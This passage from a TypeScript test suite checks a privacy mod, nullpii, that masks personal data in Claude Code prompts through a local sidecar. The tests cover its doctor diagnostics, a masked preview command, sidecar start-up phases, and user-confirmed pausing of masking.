  expect(lines[0]).not.toContain('npx or Docker');
  // The reason is repeated only by the last-failure line.
  expect(lines.slice(0, 7).filter((line) => line.includes('did not prove'))).toHaveLength(1);
});

test('/pii doctor tells an older sidecar apart from a broken one', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  await start($);
  sidecar.state.status = {
    gatewayVersion: undefined,
    nullpiiVersion: undefined,
    backend: undefined,
    model: undefined,
  };

  const answer = await $.command.run(typed('pii', 'doctor'));
  const lines = answer.text.split('\n');

  for (const line of [lines[1], lines[2], lines[3]]) {
    expect(line).toContain('this sidecar does not report it');
    expect(line).toContain('an older sidecar is still running');
  }
  expect(lines[5]).toBe('PASS Policy file: loaded and parsed');
});

test('/pii doctor still runs local checks with the sidecar down', async ($, on) => {
  const sidecar = fakeSidecar({ down: true });
  stubSession(on, sidecar);
  await start($);

  const answer = await $.command.run(typed('pii', 'doctor'));
  const lines = answer.text.split('\n');

  expect(lines).toHaveLength(8);
  // The reason once, on the first line; the four that need the sidecar say
  // only that they were not checked, and point at the first.
  expect(lines.filter((line) => line.includes('did not answer'))).toHaveLength(5);
  expect(lines.filter((line) => line.includes('not checked'))).toHaveLength(4);
  expect(lines.filter((line) => line.includes('nullpii-gateway did not answer'))).toHaveLength(1);
  expect(lines[0]).toContain('nullpii-gateway did not answer');
  expect(lines[0]).toContain('npx or Docker (start Docker first), or enable "Start the sidecar"');
  expect(lines[4]).toBe('PASS Token: set (value not shown)');
  expect(lines[6]).toBe('INFO Mod state: starting');
  expect(lines[7]).toMatch(/^INFO Last failure: (?!none$).+/);
});

test('/pii doctor reports a missing token without asking the sidecar', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar, {});
  await start($);
  const callsBefore = sidecar.calls.length;

  const answer = await $.command.run(typed('pii', 'doctor'));

  expect(answer.text).toContain('FAIL Token: not set. Fix: set sidecar_token');
  expect(answer.text).toContain('INFO Mod state: blocking');
  expect(answer.text).toContain('INFO Last failure: no sidecar token');
  expect(sidecar.calls).toHaveLength(callsBefore);
});

test('/pii doctor distinguishes a policy default and a paused mod', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const questions: string[] = [];
  answerDialog(on, 'Pause masking', questions);
  await start($);
  await $.command.run(typed('pii', 'pause'));
  sidecar.state.status = { policy: { loaded: false } };

  const answer = await $.command.run(typed('pii', 'doctor'));

  expect(answer.text).toContain('PASS Policy file: no file; built-in defaults loaded');
  expect(answer.text).toContain('INFO Mod state: paused');
});

test('/pii try keeps only sanitized arguments and closes its random session', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const downstream: string[] = [];
  on('command.run', { command: 'pii' }, ($, e) => {
    downstream.push(e.args);
    return { text: 'downstream' };
  });
  await start($);
  const conversationSecret = sidecar.sessions.get('session-1');
  const sample = 'Mail John at john@acme.io';

  const answer = await $.command.run(typed('pii', `try ${sample}`));

  expect(downstream).toHaveLength(1);
  expect(downstream[0]).toBe(`try Mail ${ph('PERSON', 1)} at ${ph('EMAIL', 0)}`);
  expect(answer.text).toContain('Local preview (throwaway session closed):');
  expect(answer.text).toContain('Masked: 2');
  expect(answer.text).toContain('EMAIL 1');
  expect(answer.text).toContain('PERSON 1');
  expect(sidecar.sessions.get('session-1')).toBe(conversationSecret);
  expect([...sidecar.sessions.keys()].filter((key) => key.startsWith('try-'))).toEqual([]);
  const previewCalls = sidecar.calls.filter((call) => call.includes('/try-'));
  expect(previewCalls).toHaveLength(3);
  expect(previewCalls[0]).toMatch(/^PUT \/v1\/sidecar\/sessions\/try-[0-9a-f]{64}$/);
  expect(previewCalls[1]).toMatch(/^POST \/v1\/sidecar\/sessions\/try-[0-9a-f]{64}\/sanitize$/);
  expect(previewCalls[2]).toMatch(/^DELETE \/v1\/sidecar\/sessions\/try-[0-9a-f]{64}$/);
  expect(sidecar.sanitizeBodies.at(-1)).toContain(sample);
  for (const shown of [
    answer.text,
    downstream.join('\n'),
    sidecar.logs.join('\n'),
    sidecar.toasts.join('\n'),
  ]) {
    expect(shown).not.toContain(sample);
    expect(shown).not.toContain('John');
    expect(shown).not.toContain('john@acme.io');
  }
});

test('/pii try redacts its arguments and closes the throwaway session when masking fails', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const downstream: string[] = [];
  on('command.run', { command: 'pii' }, ($, e) => {
    downstream.push(e.args);
    return { text: 'downstream' };
  });
  await start($);
  sidecar.state.failSanitize = true;
  const sample = 'Mail John at john@acme.io';

  const answer = await $.command.run(typed('pii', `try ${sample}`));

  expect(downstream).toEqual(['try [sample not stored]']);
  expect(answer.text).toContain(
    'nullpii could not preview the sample locally: nullpii sidecar answered 500',
  );
  expect(answer.text).not.toContain('failure quoting John');
  expect(answer.text).not.toContain(sample);
  expect(sidecar.logs.join('\n')).not.toContain('John');
  expect([...sidecar.sessions.keys()].filter((key) => key.startsWith('try-'))).toEqual([]);
  expect(sidecar.calls.some((call) => /^DELETE .*\/try-/.test(call))).toBe(true);
  expect(sidecar.sessions.has('session-1')).toBe(true);
});

test('/pii try redacts a malformed answer and still closes the session', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const downstream: string[] = [];
  on('command.run', { command: 'pii' }, ($, e) => {
    downstream.push(e.args);
    return { text: 'downstream' };
  });
  await start($);
  sidecar.state.previewAnswer = {
    value: 'untrusted John',
    captured: 1,
    capturedByLabel: { 'john@acme.io': 1 },
  };

  const answer = await $.command.run(typed('pii', 'try Mail John at john@acme.io'));

  expect(downstream).toEqual(['try [sample not stored]']);
  expect(answer.text).not.toContain('untrusted John');
  expect(answer.text).not.toContain('john@acme.io');
  expect([...sidecar.sessions.keys()].filter((key) => key.startsWith('try-'))).toEqual([]);
});

test('/pii try from the menu only explains the safe typed form', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const asked: Asked[] = [];
  answerMenu(on, [MENU_MORE_ENTRY, piiCommandDescription('try <text>')], asked);
  await start($);

  const answer = await $.command.run({ command: 'pii', args: '' });

  expect(answer.text).toContain('Usage: /pii try <text>');
  expect(asked[1]?.options).toHaveLength(4);
  expect(sidecar.calls.filter((call) => call.includes('/try-'))).toEqual([]);
});

/** Answer the mod's mask dialog with `label`, recording each question. */
function answerDialog(on, label: string, questions: string[]) {
  on('tool.call', { tool: 'AskUserQuestion' }, ($, e) => {
    const question = e.questions[0]?.question ?? '';
    questions.push(question);
    return { result: { questions: e.questions, answers: { [question]: label } } };
  });
}

/** A phrase only the pause dialog's question holds, told apart from the
 * menu's own questions. */
const PAUSE_QUESTION_WORDS = 'Pause masking for this session?';

/** Answer the mod's pause dialog with `label`, recording each question and
 * the options it offered. Any other dialog — `/pii` with no arguments opens
 * the menu — is left unanswered, as one no one can answer. */
function answerPause(on, label: string, asked: Asked[]) {
  on('tool.call', { tool: 'AskUserQuestion' }, ($, e) => {
    const q = e.questions[0];
    const question = q?.question ?? '';
    if (!question.includes(PAUSE_QUESTION_WORDS)) return { deny: 'dismissed' };
    asked.push({ question, options: (q?.options ?? []).map((o) => o.label) });
    return { result: { questions: e.questions, answers: { [question]: label } } };
  });
}

test('a value of an `ask` category in the prompt is put to the user first: sent readable on request', async ($, on) => {
  const sidecar = fakeSidecar({ categories: { private_url: 'ask' } });
  stubSession(on, sidecar);
  const sent: string[] = [];
  const questions: string[] = [];
  answerDialog(on, 'Send readable', questions);
  on('prompt.submit', ($, e) => {
    sent.push(e.text);
    return { text: e.text };
  });
  await start($);

  await $.prompt.submit({
    text: 'read https://docs.acme.io/guide for John',
    wait: false,
    origin: COMPOSER,
  });

  expect(questions[0]).toContain('url "https://docs.acme.io/guide"');
  expect(sent).toEqual([`read https://docs.acme.io/guide for ${ph('PERSON', 0)}`]);
  // The dialog is the mod's own: its answer, which names the question and
  // so the real value, comes back to the mod unmasked. In Claude Code a
  // masked answer no longer matched the question and read as no answer.
  expect(sidecar.calls.filter((c) => c.endsWith('/sanitize'))).toHaveLength(1);
});

test('an `ask` value stays masked when the user says so, and "Always readable" changes the policy', async ($, on) => {
  const sidecar = fakeSidecar({ categories: { private_url: 'ask' } });
  stubSession(on, sidecar);
  const sent: string[] = [];
  const questions: string[] = [];
  answerDialog(on, 'Always readable', questions);
  on('prompt.submit', ($, e) => {
    sent.push(e.text);
    return { text: e.text };
  });
  await start($);

  await $.prompt.submit({ text: 'see https://docs.acme.io/a', wait: false, origin: COMPOSER });

  expect(sent).toEqual(['see https://docs.acme.io/a']);
  expect(sidecar.policyBodies).toEqual([{ categories: { private_url: 'off' } }]);
});

test('with no sidecar answering, the mod starts nullpii-gateway for the session', async ($, on) => {
  const sidecar = fakeSidecar({ down: true });
  stubSession(on, sidecar);
  mock.clock(on, { now: 1_700_000_000_000 });
  const spawned: {
    argv: readonly string[];
    cwd?: string;
    env?: Readonly<Record<string, string>>;
  }[] = [];
  // biome-ignore lint/correctness/useYield: a stand-in child that writes nothing.
  on('process.spawn', async function* ($, e) {
    spawned.push({ argv: e.argv, cwd: e.cwd, env: e.env });
    return { value: { code: 0, signal: null } };
  });
  await start($);

  expect(spawned).toHaveLength(1);
  expect(spawned[0]?.argv.at(-1)).toBe('nullpii-gateway');
  // Not the project directory, whose .npmrc could pick the registry; exact versions.
  expect(spawned[0]?.cwd).toBe('/');
  expect(spawned[0]?.argv).toEqual(
    expect.arrayContaining([
      'nullpii@0.5.4',
      'onnxruntime-node@1.30.0',
      '@lbroth/nullpii-gateway@0.5.4',
    ]),
  );
  expect(spawned[0]?.env).toMatchObject({
    NULLPII_SIDECAR_TOKEN: TOKEN,
    NULLPII_HOST: '127.0.0.1',
    NULLPII_PORT: '8787',
  });
  const report = await $.command.run({ command: 'pii', args: '' });
  expect(report.text).toContain('starting nullpii-gateway');
});

test('while the sidecar the mod started comes up, a prompt is handed back saying so', async ($, on) => {
  const sidecar = fakeSidecar({ down: true });
  stubSession(on, sidecar);
  mock.clock(on);
  // biome-ignore lint/correctness/useYield: a stand-in child that writes nothing.
  on('process.spawn', async function* ($) {
    // Still starting: the child runs until the test's clock moves.
    await $.clock.sleep(60_000);
    return { value: { code: 0, signal: null } };
  });
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  const prompt = await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(prompt.drop).toContain('starting nullpii-gateway for this session');
  expect(prompt.drop).toContain('Send it again once nullpii is on.');
  expect(prompt.drop).not.toContain('did not answer');
});

/** A sidecar the mod started that is still coming up: a stand-in child that
 * runs on, and a fake that does not answer. */
function stillStarting($, on) {
  const opts = { down: true };
  const sidecar = fakeSidecar(opts);
  stubSession(on, sidecar, { NULLPII_SIDECAR_TOKEN: TOKEN });
  const clock = mock.clock(on);
  // biome-ignore lint/correctness/useYield: a stand-in child that writes nothing.
  on('process.spawn', async function* () {
    // Still running: the test never lets its sidecar answer.
    await new Promise<never>(() => undefined);
  });
  const sent: string[] = [];
  on('prompt.submit', ($, e) => {
    sent.push(e.text);
    return { text: e.text };
  });
  return { sidecar, sent, opts, clock };
}

test('a prompt sent while nullpii starts asks first: waiting holds it, and it goes back if nullpii never comes up', async ($, on) => {
  const { sent, clock } = stillStarting($, on);
  const questions: string[] = [];
  answerDialog(on, 'Wait for nullpii (the prompt is sent masked when it is ready)', questions);
  await start($);
  // Held for a while; the sidecar never comes up, so it goes back.
  const pending = $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  await clock.advance(6 * 60_000);
  const prompt = await pending;
  expect(questions).toHaveLength(1);
  expect(questions[0]).toContain('would not be protected');
  expect(prompt.drop).toContain('Send it again once nullpii is on.');
  expect(sent).toEqual([]);
});

test('sending now while nullpii starts goes out as typed, once; the band and padlock say not protected yet', async ($, on) => {
  const { sent } = stillStarting($, on);
  const questions: string[] = [];
  answerDialog(on, 'Send it now, unprotected', questions);
  on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
  await start($);
  const ui = await $.ui.mount(BAND);
  const first = await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(first.drop).toBeUndefined();
  expect(sent).toEqual(['Mail John']);
  // Only that prompt: the next one asks again.
  await $.prompt.submit({ text: 'Mail Mary', wait: false, origin: COMPOSER });
  expect(questions).toHaveLength(2);
  await ui.unmount();
});

test('"do not ask again until ready" sends every prompt of this start-up, and the band says so', async ($, on) => {
  const { sent } = stillStarting($, on);
  const questions: string[] = [];
  const lines: (string | undefined)[] = [];
  on('ui.status', ($, e) => {
    lines.push(e.text);
    return { value: undefined };
  });
  answerDialog(on, 'Send now, and do not ask again until nullpii is ready', questions);
  on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
  await start($);
  const ui = await $.ui.mount(BAND);
  await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  await $.prompt.submit({ text: 'Mail Mary', wait: false, origin: COMPOSER });
  expect(questions).toHaveLength(1);
  expect(sent).toEqual(['Mail John', 'Mail Mary']);
  const band = await ui.find({
    type: 'Text',
    text: 'not protected yet · installing its packages',
  });
  expect(band).toBeDefined();
  expect(band?.props.color).toBe('yellow');
  // The line under the prompt says the same, in a few characters: nothing
  // is masked, and the phase says why.
  expect(lines.at(-1)).toBe('⚠ not protected yet · installing its packages');
  await ui.unmount();
});

test('a held prompt is sent masked once nullpii is ready', async ($, on) => {
  const { sent, opts, sidecar, clock } = stillStarting($, on);
  answerDialog(on, 'Wait for nullpii (the prompt is sent masked when it is ready)', []);
  await start($);
  const pending = $.prompt.submit({
    text: 'Mail John at john@acme.io',
    wait: false,
    origin: COMPOSER,
  });
  await clock.advance(1_000);
  opts.down = false;
  sidecar.state.startup = { phase: 'ready' };
  await clock.advance(5_000);
  const out = await pending;
  expect(out.drop).toBeUndefined();
  expect(sent).toHaveLength(1);
  expect(sent[0]).not.toContain('john@acme.io');
});

test(
  'while_starting = block never asks and never sends',
  { options: { while_starting: 'block' } },
  async ($, on) => {
    const { sent, clock } = stillStarting($, on);
    const asked: string[] = [];
    answerDialog(on, 'Send it now, unprotected', asked);
    await start($);
    const pending = $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
    await clock.advance(6 * 60_000);
    const dropped = await pending;
    expect(dropped.drop).toContain('Send it again once nullpii is on.');
    expect(asked).toEqual([]);
    expect(sent).toEqual([]);
  },
);

test(
  'while_starting = pass sends without asking, and the band says not protected yet',
  { options: { while_starting: 'pass' } },
  async ($, on) => {
    const { sent } = stillStarting($, on);
    const asked: string[] = [];
    answerDialog(on, 'Wait for nullpii', asked);
    await start($);
    const out = await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
    expect(out.drop).toBeUndefined();
    expect(asked).toEqual([]);
    expect(sent).toEqual(['Mail John']);
  },
);

test("a prompt the engine made, not the person, is never sent unprotected on the person's answer", async ($, on) => {
  const { sent } = stillStarting($, on);
  const questions: string[] = [];
  answerDialog(on, 'Send it now, unprotected', questions);
  await start($);
  const out = await $.prompt.submit({
    text: 'Mail John',
    wait: false,
    origin: COMPOSER,
    isMeta: true,
  });
  expect(out.drop).toBeDefined();
  expect(questions).toEqual([]);
  expect(sent).toEqual([]);
});

test('a sidecar the mod started that exits before it answers is reported at once', async ($, on) => {
  const sidecar = fakeSidecar({ down: true });
  stubSession(on, sidecar);
  const clock = mock.clock(on);
  // biome-ignore lint/correctness/useYield: a stand-in child that fails at once.
  on('process.spawn', async function* () {
    return { value: { code: 1, signal: null } };
  });
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  await clock.advance(2_000);
  const status = await $.command.run({ command: 'pii', args: '' });
  expect(status.text).toContain('exited while installing its packages');
  // Nothing is starting any more: the prompt says no sidecar answers.
  const prompt = await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(prompt.drop).toContain('did not answer at the sidecar address');
});

/** The fake sidecar, stubs and a still clock, for a sidecar the mod starts:
 * the fake answers once the test flips `opts.down` and sets its
 * `state.startup`, as a gateway does while its model warms up. The test
 * registers its own child before calling `start($)`. */
function beforeStart($, on, opts: { down: boolean }) {
  const sidecar = fakeSidecar(opts);
  stubSession(on, sidecar);
  const clock = mock.clock(on, { now: 1_700_000_000_000 });
  on('prompt.submit', ($, e) => ({ text: e.text }));
  return { sidecar, clock };
}

test('the band walks the start-up phases, with the model download moving', async ($, on) => {
  const opts = { down: true };
  const { sidecar, clock } = beforeStart($, on, opts);
  // biome-ignore lint/correctness/useYield: a stand-in child that runs on.
  on('process.spawn', async function* () {
    // Still running: its sidecar answers when the test flips the fake.
    await new Promise<never>(() => undefined);
  });
  const lines: (string | undefined)[] = [];
  on('ui.status', ($, e) => {
    lines.push(e.text);
    return { value: undefined };
  });
  on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
  await start($);
  const ui = await $.ui.mount(BAND);
  expect(
    await ui.find({
      type: 'Text',
      text: 'starting · installing its packages',
    }),
  ).toBeDefined();
  // The padlock is drawn from the start: open while the sidecar comes up.
  expect(await ui.find({ type: 'Raster', key: 'nullpii-lock' })).toBeDefined();
  expect(lines.at(-1)).toBe('⏳ starting · installing its packages');

  // The sidecar comes up and reports the model downloading: the bytes move.
  opts.down = false;
  sidecar.state.startup = {
    phase: 'downloading',
    file: 'model.onnx',
    received: 640_000_000,
    total: 1_160_000_000,
  };
  await clock.advance(2_000);
  expect(
    await ui.find({
      type: 'Text',
      text: 'starting · downloading the model ▰▰▰▰▰▰▰▱▱▱▱▱ 55% · 640 / 1,160 MB',
    }),
  ).toBeDefined();
  // The line under the prompt has the same phase in a few characters,
  // with the progress the sidecar reports.
  expect(lines.at(-1)).toBe('⏳ starting · downloading the model ▰▰▰▱▱▱ 55%');
  sidecar.state.startup = {
    phase: 'downloading',
    file: 'model.onnx',
    received: 1_100_000_000,
    total: 1_160_000_000,
  };
  await clock.advance(2_000);
  expect(
    await ui.find({
      type: 'Text',
      text: 'starting · downloading the model ▰▰▰▰▰▰▰▰▰▰▰▱ 95% · 1,100 / 1,160 MB',
    }),
  ).toBeDefined();
  expect(lines.at(-1)).toBe('⏳ starting · downloading the model ▰▰▰▰▰▰ 95%');

  // The session's model loads: still nothing sent, still the phase shown.
  sidecar.state.startup = { phase: 'loading' };
  await clock.advance(2_000);
  expect(
    await ui.find({
      type: 'Text',
      text: 'starting · loading the model',
    }),
  ).toBeDefined();
  expect(lines.at(-1)).toBe('⏳ starting · loading the model');
  // No one answers the start-up dialog, so the prompt waits for the model;
  // past the hold it goes back to the person, as it did before.
  const pending = $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  await clock.advance(6 * 60_000);
  const held = await pending;
  expect(held.drop).toContain('starting nullpii-gateway for this session (loading the model)');
  expect(held.drop).toContain('Send it again once nullpii is on.');

  // Ready: nothing needs saying any more, so the band is put away and the
  // user is told; a prompt that was held back goes through once it is sent.
  sidecar.state.startup = { phase: 'ready' };
  await clock.advance(2_000);
  expect(sidecar.toasts).not.toContain('nullpii is on');
  expect(await ui.find({ type: 'Text', text: 'nothing masked yet' })).toBeUndefined();
  expect(await ui.find({ type: 'Raster', key: 'nullpii-lock' })).toBeUndefined();
  expect(lines.at(-1)).toBe('🔒 0');
  const sent = await $.prompt.submit({
    text: 'Mail John at john@acme.io',
    wait: false,
    origin: COMPOSER,
  });
  expect(sent.drop).toBeUndefined();
  expect(sent.text).not.toContain('john@acme.io');
  await ui.unmount();
});

test('a warmup that fails says which phase it failed in, and prompts go the normal way', async ($, on) => {
  const opts = { down: true };
  const { sidecar, clock } = beforeStart($, on, opts);
  // biome-ignore lint/correctness/useYield: a stand-in child that runs on.
  on('process.spawn', async function* () {
    await new Promise<never>(() => undefined);
  });
  await start($);
  await clock.advance(2_000);
  opts.down = false;
  sidecar.state.startup = {
    phase: 'downloading',
    file: 'model.onnx',
    received: 640_000_000,
    total: 1_160_000_000,
  };
  await clock.advance(2_000);
  // The warmup failed: the report is read while the gateway still answers.
  sidecar.state.startup = { phase: 'failed', while: 'downloading' };
  await clock.advance(2_000);
  // Its model is dead, so it answers no more; the start is over.
  opts.down = true;
  const status = await $.command.run({ command: 'pii', args: '' });
  expect(status.text).toContain(
    'the nullpii-gateway this session started failed while downloading the model',
  );
  // The start is over: a prompt is not held back for it, but fail closed
  // as usual.
  const prompt = await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(prompt.drop).toContain('did not answer at the sidecar address');
});

test('a start that never gets the model ready in time says which phase it was in', async ($, on) => {
  const opts = { down: true };
  const { sidecar, clock } = beforeStart($, on, opts);
  // biome-ignore lint/correctness/useYield: a stand-in child that runs on.
  on('process.spawn', async function* () {
    await new Promise<never>(() => undefined);
  });
  await start($);
  await clock.advance(2_000);
  opts.down = false;
  sidecar.state.startup = {
    phase: 'downloading',
    file: 'model.onnx',
    received: 640_000_000,
    total: 1_160_000_000,
  };
  await clock.advance(2_000);
  await clock.advance(10 * 60 * 1000);
  // The start's loop gives up in the background: look until it has, so a
  // slow machine does not read the status a moment too soon.
  let status = await $.command.run({ command: 'pii', args: '' });
  for (let i = 0; i < 20 && !status.text.includes('did not get the model ready'); i++) {
    await clock.advance(2_000);
    status = await $.command.run({ command: 'pii', args: '' });
  }
  expect(status.text).toContain(
    'did not get the model ready in time (still downloading the model)',
  );
  // The gateway answers all the same: masking works, so the next prompt
  // goes through masked instead of being held back for the dead start.
  const prompt = await $.prompt.submit({
    text: 'Mail John at john@acme.io',
    wait: false,
    origin: COMPOSER,
  });
  expect(prompt.drop).toBeUndefined();
  expect(prompt.text).not.toContain('john@acme.io');
});

test('a gateway with no start-up field to report counts as ready, and the session opens', async ($, on) => {
  const opts = { down: true };
  const { sidecar, clock } = beforeStart($, on, opts);
  // biome-ignore lint/correctness/useYield: a stand-in child that runs on.
  on('process.spawn', async function* () {
    await new Promise<never>(() => undefined);
  });
  await start($);
  await clock.advance(2_000);
  opts.down = false;
  await clock.advance(2_000);
  expect(sidecar.toasts).not.toContain('nullpii is on');
  const prompt = await $.prompt.submit({
    text: 'Mail John at john@acme.io',
    wait: false,
    origin: COMPOSER,
  });
  expect(prompt.drop).toBeUndefined();
  expect(prompt.text).not.toContain('john@acme.io');
});

test('the person pauses with /pii pause, and the band that appears turns masking back on', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const asked: Asked[] = [];
  answerPause(on, 'Pause masking', asked);
  const sent: string[] = [];
  const lines: (string | undefined)[] = [];
  on('ui.status', ($, e) => {
    lines.push(e.text);
    return { value: undefined };
  });
  on('prompt.submit', ($, e) => {
    sent.push(e.text);
    return { text: e.text };
  });
  on('tool.call', { tool: 'Bash' }, () => ({ result: { stdout: 'owner: John', stderr: '' } }));
  on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
  await start($);
  const ui = await $.ui.mount(BAND);
  // Nothing to say while nullpii is on: no band, and so no toggle either.
  expect(await ui.find({ type: 'Button', key: 'nullpii-toggle' })).toBeUndefined();

  // The person's own `/pii pause` asks first, and pauses.
  expect((await $.command.run(typed('pii', 'pause'))).text).toContain('Masking is paused');
  expect(asked).toHaveLength(1);
  expect(asked[0]?.question).toContain(
    'Everything you send until nullpii is turned on again reaches Claude unmasked',
  );
  // Keeping it on comes first, so a quick confirm keeps masking on.
  expect(asked[0]?.options[0]).toBe('Keep masking');

  // Paused: the band is red and says so, the padlock is open and red, and
  // the toggle beside them reads off. It has no hotkey of its own, so a
  // bare digit in an empty prompt never pauses masking.
  const line = await ui.find({
    type: 'Text',
    text: 'paused · everything you send reaches Claude unmasked',
  });
  expect(line).toBeDefined();
  expect(line?.props.color).toBe('red');
  expect(await ui.find({ type: 'Raster', key: 'nullpii-lock' })).toBeDefined();
  const toggle = await ui.find({ type: 'Button', key: 'nullpii-toggle' });
  expect(toggle?.props.label).toBe('resume');
  expect(toggle?.props.hotkey).toBeUndefined();
  expect(lines.at(-1)).toBe('🔓 paused');

  // Everything goes out as it came: the prompt as typed, the tool result as
  // it came out of the tool.
  const prompt = await $.prompt.submit({
    text: 'Mail John at john@acme.io',
    wait: false,
    origin: COMPOSER,
  });
  expect(prompt.text).toBe('Mail John at john@acme.io');
  const out = await $.tool.call({ tool: 'Bash', command: 'id' });
  expect(JSON.stringify(out)).toContain('John');
  const status = await $.command.run({ command: 'pii', args: '' });
  expect(status.text).toContain('Status: paused');

  // The toggle turns masking back on at once, with no dialog about it: the
  // band is put away again and what is sent is masked.
  await ui.press({ key: 'nullpii-toggle' });
  expect(asked).toHaveLength(1);
  expect(await ui.find({ type: 'Button', key: 'nullpii-toggle' })).toBeUndefined();
  expect(lines.at(-1)).toBe('🔒 0');
  const back = await $.prompt.submit({
    text: 'Mail John at john@acme.io',
    wait: false,
    origin: COMPOSER,
  });
  expect(back.text).not.toContain('john@acme.io');
  await ui.unmount();
});

test('while paused, placeholders already in the conversation still get their values back in local tools', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const questions: string[] = [];
  answerDialog(on, 'Pause masking', questions);
  const sent: string[] = [];
  on('prompt.submit', ($, e) => {
    sent.push(e.text);
    return { text: e.text };
  });
  const written: string[] = [];
  on('tool.call', { tool: 'Write' }, ($, e) => {
    written.push(e.content);
    return { result: 'wrote notes.md' };
  });
  on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
  await start($);
  // Masked while nullpii was on: the placeholder is already in the
  // conversation, so the pause cannot unmask it.
  await $.prompt.submit({ text: 'note john@acme.io', wait: false, origin: COMPOSER });
  const placeholder = ph('EMAIL', 0);
  expect(sent).toEqual([`note ${placeholder}`]);

  await $.command.run(typed('pii', 'pause'));
  expect(questions).toHaveLength(1);

  // A local tool still gets the real value back, and the file it writes holds
  // it; the tool's answer goes to Claude unmasked, like everything else.
  const out = await $.tool.call({
    tool: 'Write',
    file_path: 'notes.md',
    content: `Contact: ${placeholder}`,
  });
  expect(written).toEqual(['Contact: john@acme.io']);
  expect(JSON.stringify(out)).not.toContain(placeholder);
  // A shell command still never gets one: the call is refused as before.
  const shell = await $.tool.call({ tool: 'Bash', command: `echo ${placeholder}` });
  expect(shell.deny).toContain(`no real value into a shell command (${placeholder})`);
});

test('a pause the user does not confirm keeps masking on', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const questions: string[] = [];
  answerDialog(on, 'Keep masking', questions);
  const lines: (string | undefined)[] = [];
  on('ui.status', ($, e) => {
    lines.push(e.text);
    return { value: undefined };
  });
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
  await start($);
  const ui = await $.ui.mount(BAND);
  expect((await $.command.run(typed('pii', 'pause'))).text).toContain('Masking stays on.');
  expect(questions).toHaveLength(1);
  // Masking never paused: nothing to say above the prompt, and the line
  // under it reads on.
  expect(await ui.find({ type: 'Button', key: 'nullpii-toggle' })).toBeUndefined();
  expect(lines.at(-1)).toBe('🔒 0');
  const prompt = await $.prompt.submit({
    text: 'Mail John at john@acme.io',
    wait: false,
    origin: COMPOSER,
  });
  expect(prompt.text).not.toContain('john@acme.io');
  await ui.unmount();
});

test('a pause no one can answer keeps masking on', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  // The dialog is denied: as in a `claude -p` run, no one answers it.
  on('tool.call', { tool: 'AskUserQuestion' }, () => ({ deny: 'dismissed' }));
  on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
  await start($);
  const ui = await $.ui.mount(BAND);
  expect((await $.command.run(typed('pii', 'pause'))).text).toContain('Masking stays on.');
  expect(await ui.find({ type: 'Button', key: 'nullpii-toggle' })).toBeUndefined();
  const prompt = await $.prompt.submit({
    text: 'Mail John at john@acme.io',
    wait: false,
    origin: COMPOSER,
  });
  expect(prompt.text).not.toContain('john@acme.io');
  await ui.unmount();
});

test('a pause the person did not type themselves is refused, and masking stays on', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  // The dialog would say yes: a pause that is not the person's never asks.
  answerDialog(on, 'Pause masking', []);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  // The test kit's `$.command.run` carries no origin: the engine stamps one
  // only for a person's own typed command, so this run is not the person's.
  const pause = await $.command.run({ command: 'pii', args: 'pause' });
  expect(pause.text).toContain('pauses masking only when you ask for it yourself');
  const resume = await $.command.run({ command: 'pii', args: 'resume' });
  expect(resume.text).toContain('pauses masking only when you ask for it yourself');
  const prompt = await $.prompt.submit({
    text: 'Mail John at john@acme.io',
    wait: false,
    origin: COMPOSER,
  });
  expect(prompt.text).not.toContain('john@acme.io');
});

test('a status line under the prompt follows the state: on, masked count, paused', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const lines: (string | undefined)[] = [];
  on('ui.status', ($, e) => {
    lines.push(e.text);
    return { value: undefined };
  });
  const questions: string[] = [];
  answerDialog(on, 'Pause masking', questions);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
  await start($);
  expect(lines.at(-1)).toBe('🔒 0');
  await $.prompt.submit({ text: 'Mail John at john@acme.io', wait: false, origin: COMPOSER });
  expect(lines.at(-1)).toMatch(/^🔒 [1-9]\d*$/);
  await $.command.run(typed('pii', 'pause'));
  expect(lines.at(-1)).toBe('🔓 paused');
});

test('the status line says the mod is blocking, and says so before it says paused', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const lines: (string | undefined)[] = [];
  on('ui.status', ($, e) => {
    lines.push(e.text);
    return { value: undefined };
  });
  const questions: string[] = [];
  answerDialog(on, 'Pause masking', questions);
